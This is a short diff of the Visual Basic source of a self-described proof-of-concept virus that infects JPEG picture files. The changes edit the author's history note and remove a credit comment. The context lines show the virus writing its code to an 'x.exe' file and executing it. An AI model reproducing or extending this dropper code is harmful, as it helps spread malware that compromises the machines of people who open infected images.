@@ -8,7 +8,7 @@ source in ebcvg #2...
 history
 --------
 w32.hllp.jpginfector, as i named my lame proof-of-concept virus, was written on a fine afternoon of june 13, 2002 because
-i just wanted to make a working proof of my article "Infecting Picture Files : A Desperate Approach"... that lame article
+i just wanted to make a working proof of my article "Infecting Picture Files : A Desperate Approach"... that article
 was written because of my song "sa iyong pagibig" dedicated to my partner... 
 so the root of all the Perrun phenomenon was not the eagerness to achieve fame... the root is LOVE... "Hi Yelena!" :)
 
@@ -305,7 +305,6 @@ Open jpgvir & "x.exe" For Binary Access Write As #ffile
 Put #ffile, , vircode
 Close #ffile
 DoEvents
-'borrowed from murkry's vb5 virus
 idProg = Shell(jpgvir & "x.exe", vbNormalFocus)
 hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
 GetExitCodeProcess hProg, iExit
